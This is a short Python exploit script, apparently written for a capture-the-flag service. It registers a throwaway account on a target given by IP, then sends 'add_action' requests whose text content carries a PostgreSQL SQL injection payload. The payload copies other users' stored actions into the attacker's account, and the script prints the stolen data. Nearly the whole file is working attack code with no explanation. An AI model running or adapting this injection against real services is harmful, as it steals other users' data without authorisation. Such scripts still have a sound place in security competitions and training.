import json
import sys
import random

import requests


def gen_rand_string(l=16):
    ABC = "abcdefghijklmnopqrstuvwxyz"

    return "".join(random.choice(ABC) for i in range(l))


s = requests.session()

def call_api(params):
    global s
    resp = s.post(f"http://{IP}:3255/api.php", data={"p": json.dumps(params)})

    print(resp.status_code)
    # print(resp.json())
    return resp.json()


IP = sys.argv[1]


login = gen_rand_string()
password = gen_rand_string()

my_userid = call_api({"action": "register", "login": login, "password": password})["userid"]


for userid in range(my_userid-1, my_userid-10, -1):
    print("add_action", userid)
    params = {
        "action":"add_action",
        "action_data":{
            "color": "#abcdef",
            "tool": "text",
            "params": {
                "content": f"'::xid::text::json,u:=1);select add_action(to_json(get_actions({userid})),{my_userid}) as id -- ",
            }
        },
    }

    call_api(params)


print(call_api({"action": "get_actions"}))

